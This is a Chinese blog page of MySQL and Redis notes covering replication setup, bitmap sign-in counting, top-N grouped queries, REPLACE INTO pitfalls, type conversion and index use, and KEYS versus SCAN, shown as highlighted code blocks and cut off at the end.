<h3 id="MySQL数据库主从复制"><a href="#MySQL数据库主从复制" class="headerlink" title="MySQL数据库主从复制"></a>MySQL数据库主从复制</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl start mysqld.service</span><br><span class="line">$ firewall-cmd --zone=public --add-port=<span class="number">80</span>/tcp --permanent</span><br><span class="line">$ firewall-cmd --reload</span><br><span class="line">master服务器配置：https:<span class="comment">//blog.yiranzai.cn/posts/5420/</span></span><br><span class="line">$ vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">server-id=<span class="number">1</span></span><br><span class="line">log-bin=mysql-bin # 启用二进制日志</span><br><span class="line"></span><br><span class="line">slave服务器配置：</span><br><span class="line">$ vim /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">log_bin           = mysql-bin</span><br><span class="line">server_id         = <span class="number">2</span></span><br><span class="line">relay_log         = mysql-relay-bin</span><br><span class="line">log_slave_updates = <span class="number">1</span></span><br><span class="line">read_only         = <span class="number">1</span></span><br><span class="line">slave-skip-errors = all   #忽略因复制出现的所有错误</span><br><span class="line"></span><br><span class="line">systemctl restart mysqld.service</span><br><span class="line">mysql&gt; MySQL -u root -p</span><br><span class="line">mysql&gt; GRANT REPLICATION SLAVE ON *.* to <span class="string">'user'</span>@<span class="string">'192.168.0.124'</span> identified by <span class="string">'password'</span>;</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">mysql&gt; FLUSH TABLES WITH READ LOCK;</span><br><span class="line">mysql&gt; show master status;</span><br><span class="line">mysql&gt; UNLOCK TABLES;</span><br><span class="line"></span><br><span class="line">mysql&gt; show maser status;</span><br><span class="line">+------------------+----------+--------------+------------------+-------------------+</span><br><span class="line">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+------------------+----------+--------------+------------------+-------------------+</span><br><span class="line">| mysql-bin<span class="number">.000004</span> |    <span class="number">24364</span> |              |                  |                   |</span><br><span class="line">+------------------+----------+--------------+------------------+-------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.02</span> sec)</span><br><span class="line">mysql&gt; change master to</span><br><span class="line"> -&gt; master_host=<span class="string">'192.168.0.123'</span>,</span><br><span class="line"> -&gt; master_user=<span class="string">'user'</span>,</span><br><span class="line"> -&gt; master_password=<span class="string">'password'</span>,</span><br><span class="line"> -&gt; master_log_file=<span class="string">'mysql-bin.000004'</span>,</span><br><span class="line"> -&gt; master_log_pos=<span class="number">24364</span>;</span><br><span class="line"></span><br><span class="line">mysql&gt; start slave;</span><br><span class="line">mysql&gt; show slave status \G;</span><br><span class="line">*************************** <span class="number">1.</span> row ***************************</span><br><span class="line">               Slave_IO_State: Waiting <span class="keyword">for</span> master to send event</span><br><span class="line">                  Master_Host: <span class="number">192.169</span><span class="number">.0</span><span class="number">.123</span></span><br><span class="line">                  Master_User: user</span><br><span class="line">                  Master_Port: <span class="number">3306</span></span><br><span class="line">                Connect_Retry: <span class="number">60</span></span><br><span class="line">              Master_Log_File: mysql-bin<span class="number">.000004</span></span><br><span class="line">          Read_Master_Log_Pos: <span class="number">24364</span></span><br><span class="line">               Relay_Log_File: mysql-relay-bin<span class="number">.000292</span></span><br><span class="line">                Relay_Log_Pos: <span class="number">283</span></span><br><span class="line">        Relay_Master_Log_File: mysql-bin<span class="number">.000004</span></span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="Redis-快速实现签到统计"><a href="#Redis-快速实现签到统计" class="headerlink" title="Redis 快速实现签到统计"></a>Redis 快速实现签到统计</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/25181</span></span><br><span class="line">在你想要的位置操作字节值，比如说用户 <span class="number">3</span> 在 <span class="number">3</span>月<span class="number">13</span>号 签到了，那么 setbit(<span class="number">20190313</span>, <span class="number">3</span> ,<span class="number">1</span>) 就可以实现签到功能了，这里的 offset 就是<span class="number">3</span></span><br><span class="line"> $dayKey = <span class="string">'login:'</span>.\date(<span class="string">'Ymd'</span>,\time());</span><br><span class="line">$redis-&gt;bitop(<span class="string">'AND'</span>, <span class="string">'threeAnd'</span>, <span class="string">'login:20190311'</span>, <span class="string">'login:20190312'</span>, <span class="string">'login:20190313'</span>);</span><br><span class="line">echo <span class="string">"连续三天都签到的用户数量："</span> . $redis-&gt;bitCount(<span class="string">'threeAnd'</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;bitop(<span class="string">'OR'</span>, <span class="string">'threeOr'</span>, <span class="string">'login:20190311'</span>, <span class="string">'login:20190312'</span>, <span class="string">'login:20190313'</span>);</span><br><span class="line">echo <span class="string">"三天中签到用户数量（有一天签也算签了）："</span> . $redis-&gt;bitCount(<span class="string">'threeOr'</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;bitop(<span class="string">'AND'</span>, <span class="string">'monthActivities'</span><span class="string">', $redis-&gt;keys('</span>login:<span class="number">201903</span>*<span class="string">'));</span></span><br><span class="line"><span class="string">echo "连续一个月签到用户数量：" . $redis-&gt;bitCount('</span>monthActivities<span class="string">');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "当前用户指定天数是否签到：" . $redis-&gt;getbit('</span>login:<span class="number">20190311</span><span class="string">', $this-&gt;user-&gt;id);</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL分组查询TOP-N的实践和踩坑"><a href="#MySQL分组查询TOP-N的实践和踩坑" class="headerlink" title="MySQL分组查询TOP N的实践和踩坑"></a>MySQL分组查询TOP N的实践和踩坑</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//blog.yiranzai.cn/posts/991/ 三个字段 课程 学生 成绩，如何取每门课程成绩 top3 的学生</span></span><br><span class="line">CREATE TABLE <span class="string">`test2`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">11</span>) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> varchar(<span class="number">20</span>) DEFAULT NULL,</span><br><span class="line">  <span class="string">`course`</span> varchar(<span class="number">20</span>) DEFAULT NULL,</span><br><span class="line">  <span class="string">`score`</span> int(<span class="number">11</span>) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>),</span><br><span class="line">  KEY <span class="string">`course`</span> (<span class="string">`course`</span>,<span class="string">`score`</span>) USING BTREE</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=<span class="number">1</span> DEFAULT CHARSET=utf8mb4;</span><br><span class="line">ysql&gt; INSERT INTO <span class="string">`test2`</span>(name,course,score) VALUES</span><br><span class="line">(<span class="string">'a1'</span>, <span class="string">'a'</span>, <span class="number">50</span>),</span><br><span class="line">(<span class="string">'a2'</span>, <span class="string">'a'</span>, <span class="number">50</span>),</span><br><span class="line">(<span class="string">'a3'</span>, <span class="string">'a'</span>, <span class="number">50</span>),</span><br><span class="line">(<span class="string">'a4'</span>, <span class="string">'a'</span>, <span class="number">40</span>),</span><br><span class="line">(<span class="string">'a5'</span>, <span class="string">'a'</span>, <span class="number">40</span>),</span><br><span class="line">(<span class="string">'a6'</span>, <span class="string">'a'</span>, <span class="number">40</span>),</span><br><span class="line">(<span class="string">'a7'</span>, <span class="string">'a'</span>, <span class="number">30</span>),</span><br><span class="line">(<span class="string">'a8'</span>, <span class="string">'a'</span>, <span class="number">30</span>),</span><br><span class="line">(<span class="string">'a9'</span>, <span class="string">'a'</span>, <span class="number">30</span>);</span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> test2;</span><br><span class="line">+----+------+--------+-------+</span><br><span class="line">| id | name | course | score |</span><br><span class="line">+----+------+--------+-------+</span><br><span class="line">|  <span class="number">1</span> | a1   | a      |    <span class="number">50</span> |</span><br><span class="line">|  <span class="number">2</span> | a2   | a      |    <span class="number">50</span> |</span><br><span class="line">|  <span class="number">3</span> | a3   | a      |    <span class="number">50</span> |</span><br><span class="line">|  <span class="number">4</span> | a4   | a      |    <span class="number">40</span> |</span><br><span class="line">|  <span class="number">5</span> | a5   | a      |    <span class="number">40</span> |</span><br><span class="line">|  <span class="number">6</span> | a6   | a      |    <span class="number">40</span> |</span><br><span class="line">|  <span class="number">7</span> | a7   | a      |    <span class="number">30</span> |</span><br><span class="line">|  <span class="number">8</span> | a8   | a      |    <span class="number">30</span> |</span><br><span class="line">|  <span class="number">9</span> | a9   | a      |    <span class="number">30</span> |</span><br><span class="line">+----+------+--------+-------+</span><br><span class="line"><span class="number">9</span> rows <span class="keyword">in</span> set (<span class="number">0.06</span> sec)</span><br><span class="line">select *</span><br><span class="line"><span class="keyword">from</span> test1 a</span><br><span class="line">where <span class="number">3</span>&gt;(select count(*) <span class="keyword">from</span> test1 where course=a.course and score&gt;a.score)</span><br><span class="line">order by a.course,a.score desc;</span><br></pre></td></tr></table></figure>
<h3 id="case-when"><a href="#case-when" class="headerlink" title="case when"></a>case when</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">    CASE</span><br><span class="line">    WHEN user_sleep_time &lt;= <span class="number">1536595176</span></span><br><span class="line">        AND user_sleep_time &gt; <span class="number">1535212776</span> THEN</span><br><span class="line">    <span class="string">'twoWeekdsAgo'</span></span><br><span class="line">    WHEN user_sleep_time &lt;= <span class="number">1535212776</span></span><br><span class="line">        AND user_sleep_time &gt; <span class="number">1532620776</span> THEN</span><br><span class="line">    <span class="string">'thirtyDaysAgo'</span></span><br><span class="line">    WHEN user_sleep_time &lt;= <span class="number">1532620776</span></span><br><span class="line">        AND user_sleep_time &gt; <span class="number">1530028776</span> THEN</span><br><span class="line">    <span class="string">'sixtyDaysAgo'</span></span><br><span class="line">    WHEN user_sleep_time &lt;= <span class="number">1530028776</span></span><br><span class="line">        AND user_sleep_time &gt; <span class="number">1527436776</span> THEN</span><br><span class="line">    <span class="string">'ninetyDaysAgo'</span></span><br><span class="line">    WHEN user_sleep_time &lt;= <span class="number">1527436776</span></span><br><span class="line">        AND user_sleep_time &gt; <span class="number">1524844776</span> THEN</span><br><span class="line">    <span class="string">'oneHundredAndTwentyDaysAgo'</span></span><br><span class="line">    WHEN user_sleep_time &lt;= <span class="number">1524844776</span></span><br><span class="line">        AND user_sleep_time &gt; <span class="number">1522252776</span> THEN</span><br><span class="line">    <span class="string">'oneHundredAndFiftyDaysAgo'</span></span><br><span class="line">    WHEN user_sleep_time &lt;= <span class="number">1522252776</span> THEN</span><br><span class="line">    <span class="string">'oneHundredAndEightyDaysAgo'</span></span><br><span class="line">    ELSE <span class="number">0</span></span><br><span class="line">    END sleep, COUNT(*) AS userCount</span><br><span class="line">FROM <span class="string">`user_sleep_relation`</span></span><br><span class="line">WHERE <span class="string">`user_recall_time`</span> &lt; <span class="number">1536595176</span></span><br><span class="line">GROUP BY  <span class="string">`sleep`</span>  </span><br><span class="line">https:<span class="comment">//learnku.com/articles/17547</span></span><br></pre></td></tr></table></figure>
<h3 id="mysql-replace-into-坑"><a href="#mysql-replace-into-坑" class="headerlink" title="mysql replace into 坑"></a>mysql replace into 坑</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">replace into执行的逻辑</span><br><span class="line"><span class="number">1</span>、遇到PRIMARY KEY或UNIQUE索引的，新记录与旧记录有冲突的（这里实际产生了异常duplicate key error），会把旧记录删除，然后再插入新记录</span><br><span class="line"><span class="number">2</span>、若是新记录没有冲突，就直接插入一条新记录，与insert into一样</span><br><span class="line"> </span><br><span class="line">看起来很正常，这里针对第一种逻辑会有问题https:<span class="comment">//jjhpeopl.iteye.com/blog/2368927  https://blog.xupeng.me/2013/10/11/mysql-replace-into-trap/</span></span><br><span class="line"><span class="number">1</span>、把旧记录删除之后，插入的新记录只是插入了那些指定的字段，原本不想更新的字段，直接为默认值了，会导致数据丢失</span><br><span class="line"><span class="number">2</span>、若旧记录的id跟其他表是有关联的，更新后新记录会产生新的id，导致这种关联丢失</span><br><span class="line"><span class="number">3</span>、而且使用replace into会导致自增主键id一直增大，很容易导致id值范围不够用</span><br><span class="line">另外，若是数据库存在主从关系，在主机器上进行了replace into操作之后，从机器上对应表的AUTO_INCREMENT是不会更新的，导致从机器转为主机器时，新插入数据会出现异常，直到AUTO_INCREMENT增加到原来主机器的值为止。 </span><br><span class="line">CREATE TABLE <span class="string">`auto`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">10</span>) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`k`</span> int(<span class="number">10</span>) unsigned NOT NULL,</span><br><span class="line">  <span class="string">`v`</span> varchar(<span class="number">100</span>) DEFAULT NULL,</span><br><span class="line">  <span class="string">`extra`</span> varchar(<span class="number">200</span>) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>),</span><br><span class="line">  UNIQUE KEY <span class="string">`uk_k`</span> (<span class="string">`k`</span>)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=latin1</span><br><span class="line">INSERT INTO auto (k, v, extra) VALUES (<span class="number">1</span>, <span class="string">'1'</span>, <span class="string">'extra 1'</span>), (<span class="number">2</span>, <span class="string">'2'</span>, <span class="string">'extra 2'</span>), (<span class="number">3</span>, <span class="string">'3'</span>, <span class="string">'extra 3'</span>);</span><br><span class="line">Query OK, <span class="number">3</span> rows affected (<span class="number">0.01</span> sec)</span><br><span class="line">Records: <span class="number">3</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">xupeng@diggle7:<span class="number">3600</span>(dba_m) [dba] mysql&gt; SHOW CREATE TABLE auto\G</span><br><span class="line">*************************** <span class="number">1.</span> row ***************************</span><br><span class="line">       Table: auto</span><br><span class="line">Create Table: CREATE TABLE <span class="string">`auto`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">10</span>) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`k`</span> int(<span class="number">10</span>) unsigned NOT NULL,</span><br><span class="line">  <span class="string">`v`</span> varchar(<span class="number">100</span>) DEFAULT NULL,</span><br><span class="line">  <span class="string">`extra`</span> varchar(<span class="number">200</span>) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>),</span><br><span class="line">  UNIQUE KEY <span class="string">`uk_k`</span> (<span class="string">`k`</span>)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=<span class="number">4</span> DEFAULT CHARSET=latin1</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">xupeng@diggle7:<span class="number">3600</span>(dba_m) [dba] mysql&gt; SELECT * FROM auto;</span><br><span class="line">+----+---+------+---------+</span><br><span class="line">| id | k | v    | extra   |</span><br><span class="line">+----+---+------+---------+</span><br><span class="line">|  <span class="number">1</span> | <span class="number">1</span> | <span class="number">1</span>    | extra <span class="number">1</span> |</span><br><span class="line">|  <span class="number">2</span> | <span class="number">2</span> | <span class="number">2</span>    | extra <span class="number">2</span> |</span><br><span class="line">|  <span class="number">3</span> | <span class="number">3</span> | <span class="number">3</span>    | extra <span class="number">3</span> |</span><br><span class="line">+----+---+------+---------+</span><br><span class="line"><span class="number">3</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">REPLACE INTO auto (k, v) VALUES (<span class="number">1</span>, <span class="string">'1-1'</span>);</span><br><span class="line">SELECT * FROM auto;</span><br><span class="line">+----+---+------+---------+</span><br><span class="line">| id | k | v    | extra   |</span><br><span class="line">+----+---+------+---------+</span><br><span class="line">|  <span class="number">2</span> | <span class="number">2</span> | <span class="number">2</span>    | extra <span class="number">2</span> |</span><br><span class="line">|  <span class="number">3</span> | <span class="number">3</span> | <span class="number">3</span>    | extra <span class="number">3</span> |</span><br><span class="line">|  <span class="number">4</span> | <span class="number">1</span> | <span class="number">1</span><span class="number">-1</span>  | NULL    |</span><br><span class="line">+----+---+------+---------+</span><br><span class="line"><span class="number">3</span> rows <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">执行完 REPLACE INTO auto (k, v) VALUES (<span class="number">1</span>, ‘<span class="number">1</span><span class="number">-1</span>’) 之后，由于新写入记录时并未给 extra 字段指定值，原记录 extra 字段的值就「丢失」了，而通常这并非是业务上所预期的，更常见的需求实际上是，当存在 k=<span class="number">1</span> 的记录时，就把 v 字段的值更新为 ‘<span class="number">1</span><span class="number">-1</span>’，其他未指定的字段则保持原状，而满足这一需求的 MySQL 方言是 INSERT INTO auto (k, v) VALUES (<span class="number">1</span>, ‘<span class="number">1</span><span class="number">-1</span>’) ON DUPLICATE KEY UPDATE v=VALUES(v);</span><br><span class="line"></span><br><span class="line">鉴于此，很多使用 REPLACE INTO 的场景，实际上需要的是 INSERT INTO … ON DUPLICATE KEY UPDATE，在正确理解 REPLACE INTO 行为和副作用的前提下，谨慎使用 REPLACE INTO。</span><br></pre></td></tr></table></figure>
<h3 id="类型转换对-MySQL-选择索引的影响"><a href="#类型转换对-MySQL-选择索引的影响" class="headerlink" title="类型转换对 MySQL 选择索引的影响"></a>类型转换对 MySQL 选择索引的影响</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">mysql [localhost] &#123;msandbox&#125; (test) &gt; explain select age <span class="keyword">from</span></span><br><span class="line">    -&gt; indextest where name=<span class="number">111222</span>\G</span><br><span class="line">*************************** <span class="number">1.</span> row ***************************</span><br><span class="line">           id: <span class="number">1</span></span><br><span class="line">  select_type: SIMPLE</span><br><span class="line">        table: indextest</span><br><span class="line">         type: ALL</span><br><span class="line">possible_keys: idx_name</span><br><span class="line">          key: NULL</span><br><span class="line">      key_len: NULL</span><br><span class="line">          ref: NULL</span><br><span class="line">         rows: <span class="number">4</span></span><br><span class="line">        Extra: Using where</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">https:<span class="comment">//blog.xupeng.me/2012/02/08/type-conversion-and-index-selection-of-mysql/</span></span><br><span class="line">mysql [localhost] &#123;msandbox&#125; (test) &gt; SELECT <span class="string">'18015376320243459'</span> =</span><br><span class="line">    -&gt; <span class="number">18015376320243459</span>;</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| <span class="string">'18015376320243459'</span> = <span class="number">18015376320243459</span> |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|                                       <span class="number">0</span> |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql [localhost] &#123;msandbox&#125; (test) &gt; SELECT <span class="string">'18015376320243459'</span> + <span class="number">0</span>;</span><br><span class="line">+-------------------------+</span><br><span class="line">| <span class="string">'18015376320243459'</span> + <span class="number">0</span> |</span><br><span class="line">+-------------------------+</span><br><span class="line">|    <span class="number">1.80153763202435e+16</span> |</span><br><span class="line">+-------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql [localhost] &#123;msandbox&#125; (test) &gt; SELECT</span><br><span class="line">    -&gt; cast(<span class="string">'18015376320243459'</span> <span class="keyword">as</span> unsigned) =  <span class="number">18015376320243459</span>;</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| cast(<span class="string">'18015376320243459'</span> <span class="keyword">as</span> unsigned) = <span class="number">18015376320243459</span> |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|                                                         <span class="number">1</span> |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">因为浮点数精度(<span class="number">53</span> bits)问题，并且 MySQL 将字符串转换为浮点数和将整数转换为浮点数使用不同的方法，字符串 <span class="string">'18015376320243459'</span> 和整数 <span class="number">18015376320243459</span> 相比较就不相等，如果要避免隐式浮点数转换带来的精度问题，可以显式地使用 cast 做类型转换，将字符串转换为整数。</span><br><span class="line"></span><br><span class="line">按照这些规则，对于上面的例子来说，name 字段的值和查询参数 <span class="string">'111222'</span> 都会被转换为浮点数才会做比较，而很多文本都能转换为和 <span class="number">111222</span> 相等的数值，比如 <span class="string">'111222'</span>, <span class="string">'111222aabb'</span>, <span class="string">' 111222'</span> 和 <span class="string">'11122.2e1'</span>，所以 MySQL 不能有效使用索引，就退化为索引扫描甚至是全表扫描。</span><br><span class="line">反过来，如果使用一个字符串作为查询参数，对一个数字字段做比较查询，MySQL 则是可以有效利用索引的</span><br><span class="line">MySQL 可以将查询参数 <span class="string">'30'</span> 转换为确定的数值 <span class="number">30</span>，之后可以快速地在索引中找到与之相等的数值</span><br><span class="line"></span><br><span class="line"> explain select * <span class="keyword">from</span></span><br><span class="line">    -&gt; indextest where date(create_time)=<span class="string">'2012-02-02'</span>\G</span><br><span class="line">explain select * <span class="keyword">from</span></span><br><span class="line">    -&gt; indextest where create_time between <span class="string">'2012-02-02'</span> and <span class="string">'2012-02-03'</span>\G</span><br></pre></td></tr></table></figure>
<h3 id="redis-keys-scan"><a href="#redis-keys-scan" class="headerlink" title="redis keys scan"></a>redis keys scan</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$redis-&gt;keys(<span class="string">'login:201903*'</span>)</span><br><span class="line">$redis-&gt;bitop(<span class="string">'AND'</span>,  <span class="string">'monthActivities'</span><span class="string">', $redis-&gt;keys('</span>login:<span class="number">201903</span>*<span class="string">'));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "连续一个月签到用户数量：" . $redis-&gt;bitCount('</span>monthActivities<span class="string">');https://learnku.com/articles/25892</span></span><br><span class="line"><span class="string">当前的 keys 指令执行完了才可以继续，再加上 keys 操作是遍历算法，复杂度是 O(n)，乍一想就知道问题所在了，当实例中数据量过大的时候，Redis 服务可能会卡顿，其余指令可能会延时甚至超时报错..</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; setbit login:20190321 1 1</span></span><br><span class="line"><span class="string">(integer) 0</span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; setbit login:20190321 2 1</span></span><br><span class="line"><span class="string">(integer) 0</span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; setbit login:20190322 2 1</span></span><br><span class="line"><span class="string">(integer) 0</span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; setbit login:20190323 2 1</span></span><br><span class="line"><span class="string">(integer) 0</span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; keys login:201903*</span></span><br><span class="line"><span class="string">1) "login:20190323"</span></span><br><span class="line"><span class="string">2) "login:20190322"</span></span><br><span class="line"><span class="string">3) "login:20190321"</span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; scan 0 match login:201903*</span></span><br><span class="line"><span class="string">1) "3"</span></span><br><span class="line"><span class="string">2) 1) "login:20190323"</span></span><br><span class="line"><span class="string">   2) "login:20190322"</span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; scan 0 match login:201903* count 2</span></span><br><span class="line"><span class="string">1) "4"</span></span><br><span class="line"><span class="string">2) (empty list or set)</span></span><br><span class="line"><span class="string">127.0.0.1:6379&gt; scan 0 match login:201903* count 20</span></span><br><span 